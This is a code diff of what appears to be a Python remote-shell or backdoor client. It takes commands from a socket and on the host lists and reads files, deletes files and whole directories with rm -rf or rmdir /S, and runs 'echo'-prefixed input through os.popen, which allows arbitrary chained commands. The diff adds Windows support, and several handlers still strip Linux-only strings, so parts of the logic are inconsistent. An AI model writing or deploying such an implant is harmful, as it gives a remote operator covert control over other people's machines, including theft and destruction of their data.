@@ -27,12 +27,18 @@ if platform == "linux" or platform == "linux2":
     cmdList["pwdCommand"] = "pwd"
     cmdList["cdCommand"] = "cd"
     cmdList["fileContentCommand"] = "cat"
+    cmdList["rmDir"] = "rm -rf"
+    cmdList["rmFile"] = "rm"
+    cmdList["echo"] = "echo"
 elif platform == "win32":
     cmdList["listCommand"] = "dir"
-    cmdList["pwdCommand"] = "pwd"
+    cmdList["pwdCommand"] = "echo %cd%"
     cmdList["cdCommand"] = "cd"
     cmdList["fileContentCommand"] = "type"
-
+    cmdList["rmDir"] = "rmdir /S"
+    cmdList["rmFile"] = "del"
+    cmdList["echo"] = "echo"
+    
 run = True
 while run:
     cmd = s.recv(BUFFER).decode(FORMAT)
@@ -40,7 +46,7 @@ while run:
         if cmd == DC_MSG:
             run = False
             s.close()
-        elif re.search("^ls\s?", cmd):
+        elif re.search(f'^{cmdList["listCommand"]}\s?', cmd):
             lsItems = ""
             lsDir = cmd.replace("ls", "")
             lsDir = lsDir.replace(" ", "")
@@ -61,23 +67,23 @@ while run:
                     lsItems += item + "  "
             lsItems += "\n"
             s.send(lsItems.encode(FORMAT))
-        elif re.search("^cd ", cmd):
+        elif re.search(f'^{cmdList["cdCommand"]} ', cmd):
             newCmd = cmd.replace("cd ", "")
             os.chdir(newCmd)
             crrDir = f"Current dir: {getPWD()}\n"
             s.send(crrDir.encode(FORMAT))
-        elif re.search("^pwd$", cmd):
+        elif re.search(f'^{cmdList["pwdCommand"]}$', cmd):
             pwd = getPWD() + "\n"
             s.send(pwd.encode(FORMAT))
-        elif re.search("^rm -rf ", cmd):
+        elif re.search(f'^{cmdList["rmDir"]} ', cmd):
             toRemove = cmd.replace("rm -rf ", "")
             rmtree(toRemove)
             s.send(f"{colorama.Fore.GREEN}Dir: {toRemove} was deleted".encode(FORMAT))
-        elif re.search("^rm ", cmd):
+        elif re.search(f'^{cmdList["rmFile"]} ', cmd):
             toRemove = cmd.replace("rm ", "")
             os.remove(toRemove)
             s.send(f"{colorama.Fore.GREEN}File: {toRemove} was deleted".encode(FORMAT))
-        elif re.search("cat ", cmd):
+        elif re.search(f'^{cmdList["fileContentCommand"]} ', cmd):
             catFile = cmd.replace("cat ", "")
             try:
                 fileCtn = open(catFile, "r")
@@ -90,7 +96,7 @@ while run:
                 s.send(f"{colorama.Fore.RED}File doesnt't exist".encode(FORMAT))
         
         ### TODO -- test this function on other computer ###
-        elif re.search("^echo ", cmd):
+        elif re.search(f'^{cmdList["echo"]} ', cmd):
             os.popen(cmd)
             s.send(f"Exec {cmd}".encode(FORMAT))
         else:
